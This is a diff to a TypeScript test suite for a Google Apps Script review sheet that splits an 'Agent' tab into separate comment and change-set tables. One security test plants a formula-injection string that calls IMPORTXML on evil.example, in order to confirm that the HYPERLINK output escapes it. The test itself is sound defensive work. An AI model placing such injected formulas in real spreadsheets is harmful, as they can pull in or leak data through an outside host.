@@ -23,7 +23,7 @@ type Prot = { col: string; from?: number; desc: string; editors: string[]; remov
 type Rich = { text: string; links: [number, number, string][]; bold: [number, number][] };
 
 /** A fake folio: a draft with printed pages 1–3 on PDF pages 12–14 (offset 11). */
-function folio(): string {
+function folio(tabs?: Record<string, string>): string {
   const repo = mkdtempSync(join(tmpdir(), "review-sheet-"));
   mkdirSync(join(repo, "review/public-comment"), { recursive: true });
   writeFileSync(join(repo, "anchors.json"), JSON.stringify({
@@ -46,6 +46,7 @@ function folio(): string {
     lineMap: "lines.json",
     draftUrl: "https://x.example/D#page=",
     commentUrl: "https://x.example/C#",
+    ...(tabs ? { tabs } : {}),
   }));
   return repo;
 }
@@ -148,13 +149,21 @@ const tabs = () => ({
       ["3", "", "", "", "Off topic", "", "", "", "", ""],
     ],
   },
-  Agent: {
+  "Agent - Comments": {
     id: 2,
     rows: [
-      ["No.", "Comment ref", "Agentic status", "Change-sets", "Change-set", "Title", "Pull request (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)"],
-      ["1", "PC-0002", "PR open", "CS-001", "CS-001", "Fix scope", "https://github.com/o/r/pull/97\nhttps://github.com/o/r/pull/130", "Adds the scope\nFixes a typo", "2026-10-30 22:30Z"],
-      ["2", "PC-0003", "PR open", "CS-001", "CS-002", "Other", "", "", ""],
-      ["3", "PC-0004", "Not started", "CS-002", "", "", "", "", ""],
+      ["No.", "Comment ref", "Agentic status", "Change-sets"],
+      ["1", "PC-0002", "PR open", "CS-001"],
+      ["2", "PC-0003", "PR open", "CS-001"],
+      ["3", "PC-0004", "Not started", "CS-002"],
+    ],
+  },
+  "Agent - Change Sets": {
+    id: 4,
+    rows: [
+      ["Change-set", "Title", "Pull request (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)"],
+      ["CS-001", "Fix scope", "https://github.com/o/r/pull/97\nhttps://github.com/o/r/pull/130", "Adds the scope\nFixes a typo", "2026-10-30 22:30Z"],
+      ["CS-002", "Other", "", "", ""],
     ],
   },
   "Review Change Sets": {
@@ -243,7 +252,7 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
   test("security: a quote in No. cannot break out of the HYPERLINK formula", () => {
     const t = tabs();
     t["Review Public Comments"].rows[1][0] = 'x",IMPORTXML("https://evil.example","//a"),"';
-    t.Agent.rows[1][0] = t["Review Public Comments"].rows[1][0];
+    t["Agent - Comments"].rows[1][0] = t["Review Public Comments"].rows[1][0];
     const rt2 = runtime(withConfig(t, pcRows));
     load(code, rt2.g).refreshAll();
     const f = rt2.written["Review Public Comments"]["No."][0][0] as string;
@@ -265,7 +274,7 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     const t = tabs();
     t["Review Change Sets"].rows[0].push("Agentic status (filter)");
     t["Review Change Sets"].rows.slice(1).forEach((r) => r.push(""));
-    t.Agent.rows[2][2] = "Needs human";
+    t["Agent - Comments"].rows[2][2] = "Needs human";
     const rt2 = runtime(withConfig(t, pcRows));
     load(code, rt2.g).refreshAll();
     expect(rt2.written["Review Change Sets"]["Agentic status (filter)"]).toEqual([["Needs human"], ["Not started"]]);
@@ -300,8 +309,8 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     const basis = feedbackBasis(oldHdr, row, ["Title", "TWG (CS)"], "Architect Feedback");
     const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
     t["Review Change Sets"].rows = [oldHdr.map((h) => h.replace("Architect", "Committee")), row];
-    t.Agent.rows[0].push("Feedback basis (change set)");
-    t.Agent.rows[1].push(basis);
+    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
+    t["Agent - Change Sets"].rows[1].push(basis);
     const run = () => { const b = runtime(t); load(code, b.g).refreshAll(); return b.written["Review Change Sets"] ?? {}; };
     expect(run()["Committee Feedback (agent)"]).toBeUndefined();
     expect(run()["Ready for agent"]).toBeUndefined();
@@ -312,9 +321,22 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     expect(w["Ready for agent"][0][0]).toBe("No");
   });
 
+  test("a sheet with both agent tables on one Agent tab, as before 2026-10-31, works the same", () => {
+    const oneRows = configRows(buildConfig(folio({ AGENT: "Agent", AGENT_CS: "" }), "review/public-comment/sheet-sync.json"));
+    const t = withConfig(tabs(), oneRows) as Record<string, { id: number; rows: string[][] }>;
+    const c = t["Agent - Comments"].rows, cs = t["Agent - Change Sets"].rows;
+    t.Agent = { id: 2, rows: c.map((r, i) => [...r, ...(cs[i] ?? cs[0].map(() => ""))]) };
+    delete t["Agent - Comments"];
+    delete t["Agent - Change Sets"];
+    const b = runtime(t);
+    load(code, b.g).refreshAll();
+    expect(b.written["Review Change Sets"]).toEqual(rcs);
+    expect(b.written["Review Public Comments"]).toEqual(rpc);
+  });
+
   test("an edit rebuilds at once while a rebuild is quick", () => {
     const rt2 = runtime(withConfig(tabs(), pcRows));
-    load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Agent") } });
+    load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Agent - Comments") } });
     expect(rt2.props.dirty).toBeUndefined();
     expect(rt2.written["Review Change Sets"]).toBeDefined();
   });
@@ -325,7 +347,7 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     const s = load(code, rt2.g);
     s.markDirty({ range: { getSheet: () => rt2.sheet("Public Comment Source") } });
     expect(rt2.props.dirty).toBeUndefined();
-    s.markDirty({ range: { getSheet: () => rt2.sheet("Agent") } });
+    s.markDirty({ range: { getSheet: () => rt2.sheet("Agent - Comments") } });
     expect(rt2.props.dirty).toBe("1");
     s.refreshIfDirty();
     expect(rt2.props.dirty).toBeUndefined();
@@ -341,7 +363,7 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     delete rt2.written["Review Change Sets"];
     s.refreshIfDirty();
     expect(rt2.written["Review Change Sets"]).toBeUndefined();
-    t.Agent.rows[3][2] = "PR open";
+    t["Agent - Comments"].rows[3][2] = "PR open";
     s.refreshIfDirty();
     expect(rt2.written["Review Change Sets"]).toBeDefined();
   });
